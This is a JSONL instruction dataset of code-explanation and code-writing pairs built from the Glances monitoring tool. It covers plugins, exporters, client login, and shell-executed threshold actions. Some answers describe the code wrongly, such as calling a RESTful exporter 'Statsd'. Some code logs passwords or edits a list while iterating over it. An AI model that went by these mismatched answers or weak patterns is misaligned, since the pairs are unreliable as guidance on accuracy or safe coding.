{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreturning the list of plugins to export.", "response": "def _plugins_to_export(self):\n        \"\"\"Return the list of plugins to export.\"\"\"\n        ret = self.exportable_plugins\n        for p in ret:\n            if getattr(self.args, 'disable_' + p):\n                ret.remove(p)\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef load_conf(self, section, mandatories=['host', 'port'], options=None):\n        options = options or []\n\n        if self.config is None:\n            return False\n\n        # By default read the mandatory host:port items\n        try:\n            for opt in mandatories:\n                setattr(self, opt, self.config.get_value(section, opt))\n        except NoSectionError:\n            logger.error(\"No {} configuration found\".format(section))\n            return False\n        except NoOptionError as e:\n            logger.error(\"Error in the {} configuration ({})\".format(section, e))\n            return False\n\n        # Load options\n        for opt in options:\n            try:\n                setattr(self, opt, self.config.get_value(section, opt))\n            except NoOptionError:\n                pass\n\n        logger.debug(\"Load {} from the Glances configuration file\".format(section))\n        logger.debug(\"{} parameters: {}\".format(section, {opt: getattr(self, opt) for opt in mandatories + options}))\n\n        return True", "response": "Load the export section configuration in the Glances configuration file."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning the value of the item key.", "response": "def get_item_key(self, item):\n        \"\"\"Return the value of the item 'key'.\"\"\"\n        try:\n            ret = item[item['key']]\n        except KeyError:\n            logger.error(\"No 'key' available in {}\".format(item))\n        if isinstance(ret, list):\n            return ret[0]\n        else:\n            return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef parse_tags(self, tags):\n        dtags = {}\n        if tags:\n            try:\n                dtags = dict([x.split(':') for x in tags.split(',')])\n            except ValueError:\n                # one of the 'key:value' pairs was missing\n                logger.info('Invalid tags passed: %s', tags)\n                dtags = {}\n\n        return dtags", "response": "Parse tags into a dict.\n            input tags = a comma separated list of key : value pairs."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nupdate stats to a server.", "response": "def update(self, stats):\n        \"\"\"Update stats to a server.\n\n        The method builds two lists: names and values\n        and calls the export method to export the stats.\n\n        Note: this class can be overwrite (for example in CSV and Graph).\n        \"\"\"\n        if not self.export_enable:\n            return False\n\n        # Get all the stats & limits\n        all_stats = stats.getAllExportsAsDict(plugin_list=self.plugins_to_export())\n        all_limits = stats.getAllLimitsAsDict(plugin_list=self.plugins_to_export())\n\n        # Loop over plugins to export\n        for plugin in self.plugins_to_export():\n            if isinstance(all_stats[plugin], dict):\n                all_stats[plugin].update(all_limits[plugin])\n            elif isinstance(all_stats[plugin], list):\n                # TypeError: string indices must be integers (Network plugin) #1054\n                for i in all_stats[plugin]:\n                    i.update(all_limits[plugin])\n            else:\n                continue\n            export_names, export_values = self.__build_export(all_stats[plugin])\n            self.export(plugin, export_names, export_values)\n\n        return True"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nbuild the export lists.", "response": "def __build_export(self, stats):\n        \"\"\"Build the export lists.\"\"\"\n        export_names = []\n        export_values = []\n\n        if isinstance(stats, dict):\n            # Stats is a dict\n            # Is there a key ?\n            if 'key' in iterkeys(stats) and stats['key'] in iterkeys(stats):\n                pre_key = '{}.'.format(stats[stats['key']])\n            else:\n                pre_key = ''\n            # Walk through the dict\n            for key, value in iteritems(stats):\n                if isinstance(value, bool):\n                    value = json.dumps(value)\n                if isinstance(value, list):\n                    try:\n                        value = value[0]\n                    except IndexError:\n                        value = ''\n                if isinstance(value, dict):\n                    item_names, item_values = self.__build_export(value)\n                    item_names = [pre_key + key.lower() + str(i) for i in item_names]\n                    export_names += item_names\n                    export_values += item_values\n                else:\n                    export_names.append(pre_key + key.lower())\n                    export_values.append(value)\n        elif isinstance(stats, list):\n            # Stats is a list (of dict)\n            # Recursive loop through the list\n            for item in stats:\n                item_names, item_values = self.__build_export(item)\n                export_names += item_names\n                export_values += item_values\n        return export_names, export_values"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _set_stats(self, input_stats):\n        # Build the all_stats with the get_raw() method of the plugins\n        return {p: self._plugins[p].get_raw() for p in self._plugins if self._plugins[p].is_enable()}", "response": "Set the stats to the input_stats one."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nnormalize data for the InfluxDB s data model.", "response": "def _normalize(self, name, columns, points):\n        \"\"\"Normalize data for the InfluxDB's data model.\"\"\"\n\n        for i, _ in enumerate(points):\n            # Supported type:\n            # https://docs.influxdata.com/influxdb/v1.5/write_protocols/line_protocol_reference/\n            if points[i] is None:\n                # Ignore points with None value\n                del(points[i])\n                del(columns[i])\n                continue\n            try:\n                points[i] = float(points[i])\n            except (TypeError, ValueError):\n                pass\n            else:\n                continue\n            try:\n                points[i] = str(points[i])\n            except (TypeError, ValueError):\n                pass\n            else:\n                continue\n\n        return [{'measurement': name,\n                 'tags': self.parse_tags(self.tags),\n                 'fields': dict(zip(columns, points))}]"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nwrite the points to the InfluxDB server.", "response": "def export(self, name, columns, points):\n        \"\"\"Write the points to the InfluxDB server.\"\"\"\n        # Manage prefix\n        if self.prefix is not None:\n            name = self.prefix + '.' + name\n        # Write input to the InfluxDB database\n        try:\n            self.client.write_points(self._normalize(name, columns, points))\n        except Exception as e:\n            logger.error(\"Cannot export {} stats to InfluxDB ({})\".format(name,\n                                                                          e))\n        else:\n            logger.debug(\"Export {} stats to InfluxDB\".format(name))"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef filter(self, value):\n        self._filter_input = value\n        if value is None:\n            self._filter = None\n            self._filter_key = None\n        else:\n            new_filter = value.split(':')\n            if len(new_filter) == 1:\n                self._filter = new_filter[0]\n                self._filter_key = None\n            else:\n                self._filter = new_filter[1]\n                self._filter_key = new_filter[0]\n\n        self._filter_re = None\n        if self.filter is not None:\n            logger.info(\"Set filter to {} on key {}\".format(self.filter, self.filter_key))\n            # Compute the regular expression\n            try:\n                self._filter_re = re.compile(self.filter)\n                logger.debug(\"Filter regex compilation OK: {}\".format(self.filter))\n            except Exception as e:\n                logger.error(\"Cannot compile filter regex: {} ({})\".format(self.filter, e))\n                self._filter = None\n                self._filter_re = None\n                self._filter_key = None", "response": "Set the filter and compute the regular expression"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef is_filtered(self, process):\n        if self.filter is None:\n            # No filter => Not filtered\n            return False\n\n        if self.filter_key is None:\n            # Apply filter on command line and process name\n            return self._is_process_filtered(process, key='name') or \\\n                self._is_process_filtered(process, key='cmdline')\n        else:\n            # Apply filter on <key>\n            return self._is_process_filtered(process)", "response": "Return True if the process item matches the current filter\n           "}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _is_process_filtered(self, process, key=None):\n        if key is None:\n            key = self.filter_key\n        try:\n            # If the item process[key] is a list, convert it to a string\n            # in order to match it with the current regular expression\n            if isinstance(process[key], list):\n                value = ' '.join(process[key])\n            else:\n                value = process[key]\n        except KeyError:\n            # If the key did not exist\n            return False\n        try:\n            return self._filter_re.match(value) is None\n        except (AttributeError, TypeError):\n            # AttributeError\n            # Filter processes crashs with a bad regular expression pattern (issue #665)\n            # TypeError\n            # Filter processes crashs if value is None (issue #1105)\n            return False", "response": "Return True if the process [ key ] should be filtered according to the current filter"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nloads the password from the configuration file.", "response": "def load(self, config):\n        \"\"\"Load the password from the configuration file.\"\"\"\n        password_dict = {}\n\n        if config is None:\n            logger.warning(\"No configuration file available. Cannot load password list.\")\n        elif not config.has_section(self._section):\n            logger.warning(\"No [%s] section in the configuration file. Cannot load password list.\" % self._section)\n        else:\n            logger.info(\"Start reading the [%s] section in the configuration file\" % self._section)\n\n            password_dict = dict(config.items(self._section))\n\n            # Password list loaded\n            logger.info(\"%s password(s) loaded from the configuration file\" % len(password_dict))\n            logger.debug(\"Password dictionary: %s\" % password_dict)\n\n        return password_dict"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ngets the password of the current server.", "response": "def get_password(self, host=None):\n        \"\"\"\n        If host=None, return the current server list (dict).\n        Else, return the host's password (or the default one if defined or None)\n        \"\"\"\n        if host is None:\n            return self._password_dict\n        else:\n            try:\n                return self._password_dict[host]\n            except (KeyError, TypeError):\n                try:\n                    return self._password_dict['default']\n                except (KeyError, TypeError):\n                    return None"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef update(self, process_list):\n        # Get the systemctl status\n        logger.debug('{}: Update stats using systemctl {}'.format(self.NAME, self.get('systemctl_cmd')))\n        try:\n            res = check_output(self.get('systemctl_cmd').split())\n        except (OSError, CalledProcessError) as e:\n            logger.debug('{}: Error while executing systemctl ({})'.format(self.NAME, e))\n        else:\n            status = {}\n            # For each line\n            for r in to_ascii(res).split('\\n')[1:-8]:\n                # Split per space .*\n                column = r.split()\n                if len(column) > 3:\n                    # load column\n                    for c in range(1, 3):\n                        try:\n                            status[column[c]] += 1\n                        except KeyError:\n                            status[column[c]] = 1\n            # Build the output (string) message\n            output = 'Services\\n'\n            for k, v in iteritems(status):\n                output += '{}: {}\\n'.format(k, v)\n            self.set_result(output, separator=' ')\n\n        return self.result()", "response": "Update the AMP status using systemctl"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_mem(device_handle):\n    try:\n        memory_info = pynvml.nvmlDeviceGetMemoryInfo(device_handle)\n        return memory_info.used * 100.0 / memory_info.total\n    except pynvml.NVMLError:\n        return None", "response": "Get GPU device memory consumption in percent."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef init_nvidia(self):\n        if import_error_tag:\n            self.nvml_ready = False\n\n        try:\n            pynvml.nvmlInit()\n            self.device_handles = get_device_handles()\n            self.nvml_ready = True\n        except Exception:\n            logger.debug(\"pynvml could not be initialized.\")\n            self.nvml_ready = False\n\n        return self.nvml_ready", "response": "Initialize the NVIDIA API."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nupdates the GPU stats.", "response": "def update(self):\n        \"\"\"Update the GPU stats.\"\"\"\n        # Init new stats\n        stats = self.get_init_value()\n\n        # !!! JUST FOR TEST (because i did not have any NVidia GPU... :()\n        # self.stats = [{\"key\": \"gpu_id\", \"mem\": None, \"proc\": 60, \"gpu_id\": 0, \"name\": \"GeForce GTX 560 Ti\"}]\n        # self.stats = [{\"key\": \"gpu_id\", \"mem\": 10, \"proc\": 60, \"gpu_id\": 0, \"name\": \"GeForce GTX 560 Ti\"}]\n        # self.stats = [{\"key\": \"gpu_id\", \"mem\": 48.64645, \"proc\": 60.73, \"gpu_id\": 0, \"name\": \"GeForce GTX 560 Ti\"},\n        #               {\"key\": \"gpu_id\", \"mem\": 70.743, \"proc\": 80.28, \"gpu_id\": 1, \"name\": \"GeForce GTX 560 Ti\"},\n        #               {\"key\": \"gpu_id\", \"mem\": 0, \"proc\": 0, \"gpu_id\": 2, \"name\": \"GeForce GTX 560 Ti\"}]\n        # self.stats = [{\"key\": \"gpu_id\", \"mem\": 48.64645, \"proc\": 60.73, \"gpu_id\": 0, \"name\": \"GeForce GTX 560 Ti\"},\n        #               {\"key\": \"gpu_id\", \"mem\": None, \"proc\": 80.28, \"gpu_id\": 1, \"name\": \"GeForce GTX 560 Ti\"},\n        #               {\"key\": \"gpu_id\", \"mem\": 0, \"proc\": 0, \"gpu_id\": 2, \"name\": \"ANOTHER GPU\"}]\n        # !!! TO BE COMMENTED\n\n        if not self.nvml_ready:\n            return self.stats\n\n        if self.input_method == 'local':\n            stats = self.get_device_stats()\n        elif self.input_method == 'snmp':\n            # not available\n            pass\n\n        # Update the stats\n        self.stats = stats\n\n        return self.stats"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns the dict to display in the curse interface.", "response": "def msg_curse(self, args=None, max_width=None):\n        \"\"\"Return the dict to display in the curse interface.\"\"\"\n        # Init the return message\n        ret = []\n\n        # Only process if stats exist, not empty (issue #871) and plugin not disabled\n        if not self.stats or (self.stats == []) or self.is_disable():\n            return ret\n\n        # Check if all GPU have the same name\n        same_name = all(s['name'] == self.stats[0]['name'] for s in self.stats)\n\n        # gpu_stats contain the first GPU in the list\n        gpu_stats = self.stats[0]\n\n        # Header\n        header = ''\n        if len(self.stats) > 1:\n            header += '{} '.format(len(self.stats))\n        if same_name:\n            header += '{} {}'.format('GPU', gpu_stats['name'])\n        else:\n            header += '{}'.format('GPU')\n        msg = header[:17]\n        ret.append(self.curse_add_line(msg, \"TITLE\"))\n\n        # Build the string message\n        if len(self.stats) == 1 or args.meangpu:\n            # GPU stat summary or mono GPU\n            # New line\n            ret.append(self.curse_new_line())\n            # GPU PROC\n            try:\n                mean_proc = sum(s['proc'] for s in self.stats if s is not None) / len(self.stats)\n            except TypeError:\n                mean_proc_msg = '{:>4}'.format('N/A')\n            else:\n                mean_proc_msg = '{:>3.0f}%'.format(mean_proc)\n            if len(self.stats) > 1:\n                msg = '{:13}'.format('proc mean:')\n            else:\n                msg = '{:13}'.format('proc:')\n            ret.append(self.curse_add_line(msg))\n            ret.append(self.curse_add_line(\n                mean_proc_msg, self.get_views(item=gpu_stats[self.get_key()],\n                                              key='proc',\n                                              option='decoration')))\n            # New line\n            ret.append(self.curse_new_line())\n            # GPU MEM\n            try:\n                mean_mem = sum(s['mem'] for s in self.stats if s is not None) / len(self.stats)\n            except TypeError:\n                mean_mem_msg = '{:>4}'.format('N/A')\n            else:\n                mean_mem_msg = '{:>3.0f}%'.format(mean_mem)\n            if len(self.stats) > 1:\n                msg = '{:13}'.format('mem mean:')\n            else:\n                msg = '{:13}'.format('mem:')\n            ret.append(self.curse_add_line(msg))\n            ret.append(self.curse_add_line(\n                mean_mem_msg, self.get_views(item=gpu_stats[self.get_key()],\n                                             key='mem',\n                                             option='decoration')))\n        else:\n            # Multi GPU\n            for gpu_stats in self.stats:\n                # New line\n                ret.append(self.curse_new_line())\n                # GPU ID + PROC + MEM\n                id_msg = '{}'.format(gpu_stats['gpu_id'])\n                try:\n                    proc_msg = '{:>3.0f}%'.format(gpu_stats['proc'])\n                except ValueError:\n                    proc_msg = '{:>4}'.format('N/A')\n                try:\n                    mem_msg = '{:>3.0f}%'.format(gpu_stats['mem'])\n                except ValueError:\n                    mem_msg = '{:>4}'.format('N/A')\n                msg = '{}: {} mem: {}'.format(id_msg, proc_msg, mem_msg)\n                ret.append(self.curse_add_line(msg))\n\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef exit(self):\n        if self.nvml_ready:\n            try:\n                pynvml.nvmlShutdown()\n            except Exception as e:\n                logger.debug(\"pynvml failed to shutdown correctly ({})\".format(e))\n\n        # Call the father exit method\n        super(Plugin, self).exit()", "response": "Overwrite the exit method to close the GPU API."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nlogin to a Glances server", "response": "def _login_glances(self):\n        \"\"\"Login to a Glances server\"\"\"\n        client_version = None\n        try:\n            client_version = self.client.init()\n        except socket.error as err:\n            # Fallback to SNMP\n            self.client_mode = 'snmp'\n            logger.error(\"Connection to Glances server failed ({} {})\".format(err.errno, err.strerror))\n            fallbackmsg = 'No Glances server found on {}. Trying fallback to SNMP...'.format(self.uri)\n            if not self.return_to_browser:\n                print(fallbackmsg)\n            else:\n                logger.info(fallbackmsg)\n        except ProtocolError as err:\n            # Other errors\n            msg = \"Connection to server {} failed\".format(self.uri)\n            if err.errcode == 401:\n                msg += \" (Bad username/password)\"\n            else:\n                msg += \" ({} {})\".format(err.errcode, err.errmsg)\n            self.log_and_exit(msg)\n            return False\n\n        if self.client_mode == 'glances':\n            # Check that both client and server are in the same major version\n            if __version__.split('.')[0] == client_version.split('.')[0]:\n                # Init stats\n                self.stats = GlancesStatsClient(config=self.config, args=self.args)\n                self.stats.set_plugins(json.loads(self.client.getAllPlugins()))\n                logger.debug(\"Client version: {} / Server version: {}\".format(__version__, client_version))\n            else:\n                self.log_and_exit(('Client and server not compatible: '\n                                   'Client version: {} / Server version: {}'.format(__version__, client_version)))\n                return False\n\n        return True"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _login_snmp(self):\n        logger.info(\"Trying to grab stats by SNMP...\")\n\n        from glances.stats_client_snmp import GlancesStatsClientSNMP\n\n        # Init stats\n        self.stats = GlancesStatsClientSNMP(config=self.config, args=self.args)\n\n        if not self.stats.check_snmp():\n            self.log_and_exit(\"Connection to SNMP server failed\")\n            return False\n\n        return True", "response": "Login to a SNMP server"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef login(self):\n\n        if self.args.snmp_force:\n            # Force SNMP instead of Glances server\n            self.client_mode = 'snmp'\n        else:\n            # First of all, trying to connect to a Glances server\n            if not self._login_glances():\n                return False\n\n        # Try SNMP mode\n        if self.client_mode == 'snmp':\n            if not self._login_snmp():\n                return False\n\n        # Load limits from the configuration file\n        # Each client can choose its owns limits\n        logger.debug(\"Load limits from the client configuration file\")\n        self.stats.load_limits(self.config)\n\n        # Init screen\n        if self.quiet:\n            # In quiet mode, nothing is displayed\n            logger.info(\"Quiet mode is ON: Nothing will be displayed\")\n        else:\n            self.screen = GlancesCursesClient(config=self.config, args=self.args)\n\n        # Return True: OK\n        return True", "response": "Logon to the server."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nupdating stats from Glances or SNMP server.", "response": "def update(self):\n        \"\"\"Update stats from Glances/SNMP server.\"\"\"\n        if self.client_mode == 'glances':\n            return self.update_glances()\n        elif self.client_mode == 'snmp':\n            return self.update_snmp()\n        else:\n            self.end()\n            logger.critical(\"Unknown server mode: {}\".format(self.client_mode))\n            sys.exit(2)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nupdating the internal dict with the stats from Glances server.", "response": "def update_glances(self):\n        \"\"\"Get stats from Glances server.\n\n        Return the client/server connection status:\n        - Connected: Connection OK\n        - Disconnected: Connection NOK\n        \"\"\"\n        # Update the stats\n        try:\n            server_stats = json.loads(self.client.getAll())\n        except socket.error:\n            # Client cannot get server stats\n            return \"Disconnected\"\n        except Fault:\n            # Client cannot get server stats (issue #375)\n            return \"Disconnected\"\n        else:\n            # Put it in the internal dict\n            self.stats.update(server_stats)\n            return \"Connected\""}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef update(self):\n        # Init new stats\n        stats = self.get_init_value()\n\n        if self.input_method == 'local':\n            # Folder list only available in a full Glances environment\n            # Check if the glances_folder instance is init\n            if self.glances_folders is None:\n                return self.stats\n\n            # Update the foldered list (result of command)\n            self.glances_folders.update()\n\n            # Put it on the stats var\n            stats = self.glances_folders.get()\n        else:\n            pass\n\n        # Update the stats\n        self.stats = stats\n\n        return self.stats", "response": "Update the foldered list."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nmanages limits of the folder list.", "response": "def get_alert(self, stat, header=\"\"):\n        \"\"\"Manage limits of the folder list.\"\"\"\n        if not isinstance(stat['size'], numbers.Number):\n            ret = 'DEFAULT'\n        else:\n            ret = 'OK'\n\n            if stat['critical'] is not None and \\\n               stat['size'] > int(stat['critical']) * 1000000:\n                ret = 'CRITICAL'\n            elif stat['warning'] is not None and \\\n                    stat['size'] > int(stat['warning']) * 1000000:\n                ret = 'WARNING'\n            elif stat['careful'] is not None and \\\n                    stat['size'] > int(stat['careful']) * 1000000:\n                ret = 'CAREFUL'\n\n        # Get stat name\n        stat_name = self.get_stat_name(header=header)\n\n        # Manage threshold\n        self.manage_threshold(stat_name, ret)\n\n        # Manage action\n        self.manage_action(stat_name,\n                           ret.lower(),\n                           header,\n                           stat[self.get_key()])\n\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef msg_curse(self, args=None, max_width=None):\n        # Init the return message\n        ret = []\n\n        # Only process if stats exist and display plugin enable...\n        if not self.stats or self.is_disable():\n            return ret\n\n        # Max size for the interface name\n        name_max_width = max_width - 7\n\n        # Header\n        msg = '{:{width}}'.format('FOLDERS',\n                                  width=name_max_width)\n        ret.append(self.curse_add_line(msg, \"TITLE\"))\n\n        # Data\n        for i in self.stats:\n            ret.append(self.curse_new_line())\n            if len(i['path']) > name_max_width:\n                # Cut path if it is too long\n                path = '_' + i['path'][-name_max_width + 1:]\n            else:\n                path = i['path']\n            msg = '{:{width}}'.format(nativestr(path),\n                                      width=name_max_width)\n            ret.append(self.curse_add_line(msg))\n            try:\n                msg = '{:>9}'.format(self.auto_unit(i['size']))\n            except (TypeError, ValueError):\n                msg = '{:>9}'.format(i['size'])\n            ret.append(self.curse_add_line(msg, self.get_alert(i,\n                                                               header='folder_' + i['indice'])))\n\n        return ret", "response": "Return the dict to display in the curse interface."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nexecutes the commands in background and return True if the commands have been executed False otherwise.", "response": "def run(self, stat_name, criticity, commands, repeat, mustache_dict=None):\n        \"\"\"Run the commands (in background).\n\n        - stats_name: plugin_name (+ header)\n        - criticity: criticity of the trigger\n        - commands: a list of command line with optional {{mustache}}\n        - If True, then repeat the action\n        - mustache_dict: Plugin stats (can be use within {{mustache}})\n\n        Return True if the commands have been ran.\n        \"\"\"\n        if (self.get(stat_name) == criticity and not repeat) or \\\n           not self.start_timer.finished():\n            # Action already executed => Exit\n            return False\n\n        logger.debug(\"{} action {} for {} ({}) with stats {}\".format(\n            \"Repeat\" if repeat else \"Run\",\n            commands, stat_name, criticity, mustache_dict))\n\n        # Run all actions in background\n        for cmd in commands:\n            # Replace {{arg}} by the dict one (Thk to {Mustache})\n            if pystache_tag:\n                cmd_full = pystache.render(cmd, mustache_dict)\n            else:\n                cmd_full = cmd\n            # Execute the action\n            logger.info(\"Action triggered for {} ({}): {}\".format(stat_name,\n                                                                  criticity,\n                                                                  cmd_full))\n            logger.debug(\"Stats value for the trigger: {}\".format(\n                mustache_dict))\n            try:\n                Popen(cmd_full, shell=True)\n            except OSError as e:\n                logger.error(\"Can't execute the action ({})\".format(e))\n\n        self.set(stat_name, criticity)\n\n        return True"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef set_plugins(self, input_plugins):\n        header = \"glances_\"\n        for item in input_plugins:\n            # Import the plugin\n            try:\n                plugin = __import__(header + item)\n            except ImportError:\n                # Server plugin can not be imported from the client side\n                logger.error(\"Can not import {} plugin. Please upgrade your Glances client/server version.\".format(item))\n            else:\n                # Add the plugin to the dictionary\n                # The key is the plugin name\n                # for example, the file glances_xxx.py\n                # generate self._plugins_list[\"xxx\"] = ...\n                logger.debug(\"Server uses {} plugin\".format(item))\n                self._plugins[item] = plugin.Plugin(args=self.args)\n        # Restoring system path\n        sys.path = sys_path", "response": "Set the plugin list according to the Glances server."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef update(self, input_stats):\n        # For Glances client mode\n        for p in input_stats:\n            # Update plugin stats with items sent by the server\n            self._plugins[p].set_stats(input_stats[p])\n            # Update the views for the updated stats\n            self._plugins[p].update_views()", "response": "Update all the stats."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef update(self):\n        # Init new stats\n        stats = self.get_init_value()\n\n        # Grab quicklook stats: CPU, MEM and SWAP\n        if self.input_method == 'local':\n            # Get the latest CPU percent value\n            stats['cpu'] = cpu_percent.get()\n            stats['percpu'] = cpu_percent.get(percpu=True)\n            # Use the psutil lib for the memory (virtual and swap)\n            stats['mem'] = psutil.virtual_memory().percent\n            stats['swap'] = psutil.swap_memory().percent\n        elif self.input_method == 'snmp':\n            # Not available\n            pass\n\n        # Optionnaly, get the CPU name/frequency\n        # thanks to the cpuinfo lib: https://github.com/workhorsy/py-cpuinfo\n        if cpuinfo_tag:\n            cpu_info = cpuinfo.get_cpu_info()\n            #  Check cpu_info (issue #881)\n            if cpu_info is not None:\n                stats['cpu_name'] = cpu_info.get('brand', 'CPU')\n                if 'hz_actual_raw' in cpu_info:\n                    stats['cpu_hz_current'] = cpu_info['hz_actual_raw'][0]\n                if 'hz_advertised_raw' in cpu_info:\n                    stats['cpu_hz'] = cpu_info['hz_advertised_raw'][0]\n\n        # Update the stats\n        self.stats = stats\n\n        return self.stats", "response": "Update the quicklook stats using the input method."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn the list of messages to display in the UI.", "response": "def msg_curse(self, args=None, max_width=10):\n        \"\"\"Return the list to display in the UI.\"\"\"\n        # Init the return message\n        ret = []\n\n        # Only process if stats exist...\n        if not self.stats or self.is_disable():\n            return ret\n\n        # Define the data: Bar (default behavor) or Sparkline\n        sparkline_tag = False\n        if self.args.sparkline and self.history_enable():\n            data = Sparkline(max_width)\n            sparkline_tag = data.available\n        if not sparkline_tag:\n            # Fallback to bar if Sparkline module is not installed\n            data = Bar(max_width)\n\n        # Build the string message\n        if 'cpu_name' in self.stats and 'cpu_hz_current' in self.stats and 'cpu_hz' in self.stats:\n            msg_name = '{} - '.format(self.stats['cpu_name'])\n            msg_freq = '{:.2f}/{:.2f}GHz'.format(self._hz_to_ghz(self.stats['cpu_hz_current']),\n                                                 self._hz_to_ghz(self.stats['cpu_hz']))\n            if len(msg_name + msg_freq) - 6 <= max_width:\n                ret.append(self.curse_add_line(msg_name))\n            ret.append(self.curse_add_line(msg_freq))\n            ret.append(self.curse_new_line())\n        for key in ['cpu', 'mem', 'swap']:\n            if key == 'cpu' and args.percpu:\n                if sparkline_tag:\n                    raw_cpu = self.get_raw_history(item='percpu', nb=data.size)\n                for cpu_index, cpu in enumerate(self.stats['percpu']):\n                    if sparkline_tag:\n                        # Sparkline display an history\n                        data.percents = [i[1][cpu_index]['total'] for i in raw_cpu]\n                        # A simple padding in order to align metrics to the right\n                        data.percents += [None] * (data.size - len(data.percents))\n                    else:\n                        # Bar only the last value\n                        data.percent = cpu['total']\n                    if cpu[cpu['key']] < 10:\n                        msg = '{:3}{} '.format(key.upper(), cpu['cpu_number'])\n                    else:\n                        msg = '{:4} '.format(cpu['cpu_number'])\n                    ret.extend(self._msg_create_line(msg, data, key))\n                    ret.append(self.curse_new_line())\n            else:\n                if sparkline_tag:\n                    # Sparkline display an history\n                    data.percents = [i[1] for i in self.get_raw_history(item=key, nb=data.size)]\n                    # A simple padding in order to align metrics to the right\n                    data.percents += [None] * (data.size - len(data.percents))\n                else:\n                    # Bar only the last value\n                    data.percent = self.stats[key]\n                msg = '{:4} '.format(key.upper())\n                ret.extend(self._msg_create_line(msg, data, key))\n                ret.append(self.curse_new_line())\n\n        # Remove the last new line\n        ret.pop()\n\n        # Return the message with decoration\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _msg_create_line(self, msg, data, key):\n        ret = []\n\n        ret.append(self.curse_add_line(msg))\n        ret.append(self.curse_add_line(data.pre_char, decoration='BOLD'))\n        ret.append(self.curse_add_line(data.get(), self.get_views(key=key, option='decoration')))\n        ret.append(self.curse_add_line(data.post_char, decoration='BOLD'))\n        ret.append(self.curse_add_line('  '))\n\n        return ret", "response": "Create a new line to the Quickview."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef update(self, process_list):\n        # Get the systemctl status\n        logger.debug('{}: Update AMP stats using service {}'.format(self.NAME, self.get('service_cmd')))\n        try:\n            res = self.get('command')\n        except OSError as e:\n            logger.debug('{}: Error while executing service ({})'.format(self.NAME, e))\n        else:\n            if res is not None:\n                try:\n                    msg = u(check_output(res.split(), stderr=STDOUT))\n                    self.set_result(to_ascii(msg.rstrip()))\n                except CalledProcessError as e:\n                    self.set_result(e.output)\n            else:\n                # Set the default message if command return None\n                # Default sum of CPU and MEM for the matching regex\n                self.set_result('CPU: {:.1f}% | MEM: {:.1f}%'.format(\n                    sum([p['cpu_percent'] for p in process_list]),\n                    sum([p['memory_percent'] for p in process_list])))\n\n        return self.result()", "response": "Update the AMP stats using the systemctl command."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef export(self, name, columns, points):\n        if name == self.plugins_to_export()[0] and self.buffer != {}:\n            # One complete loop have been done\n            logger.debug(\"Export stats ({}) to RESTful endpoint ({})\".format(listkeys(self.buffer),\n                                                                             self.client))\n            # Export stats\n            post(self.client, json=self.buffer, allow_redirects=True)\n            # Reset buffer\n            self.buffer = {}\n\n        # Add current stat to the buffer\n        self.buffer[name] = dict(zip(columns, points))", "response": "Export the stats to the Statsd server."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef __set_folder_list(self, section):\n        for l in range(1, self.__folder_list_max_size + 1):\n            value = {}\n            key = 'folder_' + str(l) + '_'\n\n            # Path is mandatory\n            value['indice'] = str(l)\n            value['path'] = self.config.get_value(section, key + 'path')\n            if value['path'] is None:\n                continue\n            else:\n                value['path'] = nativestr(value['path'])\n\n            # Optional conf keys\n            for i in ['careful', 'warning', 'critical']:\n                # Read threshold\n                value[i] = self.config.get_value(section, key + i)\n                if value[i] is not None:\n                    logger.debug(\"{} threshold for folder {} is {}\".format(i, value[\"path\"], value[i]))\n                # Read action\n                action = self.config.get_value(section, key + i + '_action')\n                if action is not None:\n                    value[i + '_action'] = action\n                    logger.debug(\"{} action for folder {} is {}\".format(i, value[\"path\"], value[i + '_action']))\n\n            # Add the item to the list\n            self.__folder_list.append(value)", "response": "Initialize the monitored folder list."}
